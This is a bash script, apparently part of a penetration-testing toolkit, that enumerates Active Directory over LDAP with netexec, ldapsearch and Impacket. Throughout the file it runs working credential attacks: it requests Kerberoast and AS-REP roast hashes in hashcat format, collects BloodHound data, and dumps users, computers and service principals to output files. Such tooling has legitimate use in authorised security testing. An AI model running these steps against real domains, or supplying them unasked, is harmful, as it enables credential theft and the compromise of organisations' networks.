#!/usr/bin/env bash
# enum-ldap.sh — LDAP/Active Directory enumeration.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "ldap: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

# ---------- 1. nxc ldap ----------
if have nxc || have netexec; then
    NXC=$(command -v nxc || command -v netexec)
    NXC_ARGS=""
    if [ -n "${ENUM_USER:-}" ]; then
        NXC_ARGS+=" -u $ENUM_USER"
        if [ -n "${ENUM_HASH:-}" ]; then NXC_ARGS+=" -H $ENUM_HASH"
        elif [ -n "${ENUM_PASS:-}" ]; then NXC_ARGS+=" -p $ENUM_PASS"; fi
        [ -n "${ENUM_DOMAIN:-}" ] && NXC_ARGS+=" -d $ENUM_DOMAIN"
    fi
    log "nxc ldap (users, groups, asreproast, kerberoastable, machine-account quota)"
    # shellcheck disable=SC2086
    echo "$IPS" | $NXC ldap - $NXC_ARGS \
        --users --groups --kerberoasting "$OUT/kerberoast.txt" \
        --asreproast "$OUT/asreproast.txt" \
        > "$OUT/nxc_ldap.txt" 2>&1 || true

    # bloodhound-ce collection
    if [ -n "${ENUM_USER:-}" ]; then
        log "nxc ldap --bloodhound (LDAP-only collection)"
        # shellcheck disable=SC2086
        echo "$IPS" | $NXC ldap - $NXC_ARGS --bloodhound \
            --collection All --dns-server "${ENUM_DC_IP:-}" \
            > "$OUT/bloodhound.txt" 2>&1 || true
    fi
else
    miss "nxc/netexec not installed"
fi

# ---------- 2. ldapsearch (anonymous + auth) ----------
if have ldapsearch; then
    log "ldapsearch (anon naming context + base info)"
    for ip in $IPS; do
        mkdir -p "$OUT/$ip"
        ldapsearch -x -H "ldap://$ip" -s base -b '' '(objectclass=*)' \
            > "$OUT/$ip/ldap_rootDSE_anon.txt" 2>&1 || true

        if [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_DOMAIN:-}" ]; then
            BASE_DN=$(echo "$ENUM_DOMAIN" | awk -F. '{for(i=1;i<=NF;i++) printf "DC=%s%s", $i, (i<NF?",":"")}')
            log "  $ip: enumerating users / computers / GPOs"
            ldapsearch -x -H "ldap://$ip" -D "$ENUM_USER@$ENUM_DOMAIN" -w "$ENUM_PASS" \
                -b "$BASE_DN" '(objectClass=user)' sAMAccountName description memberOf \
                > "$OUT/$ip/users.txt" 2>&1 || true
            ldapsearch -x -H "ldap://$ip" -D "$ENUM_USER@$ENUM_DOMAIN" -w "$ENUM_PASS" \
                -b "$BASE_DN" '(objectClass=computer)' dNSHostName operatingSystem \
                > "$OUT/$ip/computers.txt" 2>&1 || true
            ldapsearch -x -H "ldap://$ip" -D "$ENUM_USER@$ENUM_DOMAIN" -w "$ENUM_PASS" \
                -b "$BASE_DN" '(servicePrincipalName=*)' sAMAccountName servicePrincipalName \
                > "$OUT/$ip/spns.txt" 2>&1 || true
            # AS-REP roastables
            ldapsearch -x -H "ldap://$ip" -D "$ENUM_USER@$ENUM_DOMAIN" -w "$ENUM_PASS" \
                -b "$BASE_DN" '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
                sAMAccountName \
                > "$OUT/$ip/asrep_candidates.txt" 2>&1 || true
        fi
    done
fi

# ---------- 3. Impacket GetUserSPNs / GetNPUsers ----------
if have GetUserSPNs.py && [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_DOMAIN:-}" ]; then
    log "impacket GetUserSPNs.py"
    cred="$ENUM_DOMAIN/$ENUM_USER:$ENUM_PASS"
    DC_FLAG=""
    [ -n "${ENUM_DC_IP:-}" ] && DC_FLAG="-dc-ip $ENUM_DC_IP"
    # shellcheck disable=SC2086
    GetUserSPNs.py $DC_FLAG -request "$cred" \
        > "$OUT/impacket_spns.txt" 2>&1 || true
fi
if have GetNPUsers.py && [ -n "${ENUM_DOMAIN:-}" ]; then
    log "impacket GetNPUsers.py (AS-REP roast — no auth needed if user list)"
    DC_FLAG=""
    [ -n "${ENUM_DC_IP:-}" ] && DC_FLAG="-dc-ip $ENUM_DC_IP"
    if [ -f "$OUT/_users.lst" ]; then
        # shellcheck disable=SC2086
        GetNPUsers.py $DC_FLAG "$ENUM_DOMAIN/" -usersfile "$OUT/_users.lst" -no-pass -format hashcat \
            > "$OUT/impacket_asrep.txt" 2>&1 || true
    fi
fi

log "ldap dispatcher done."
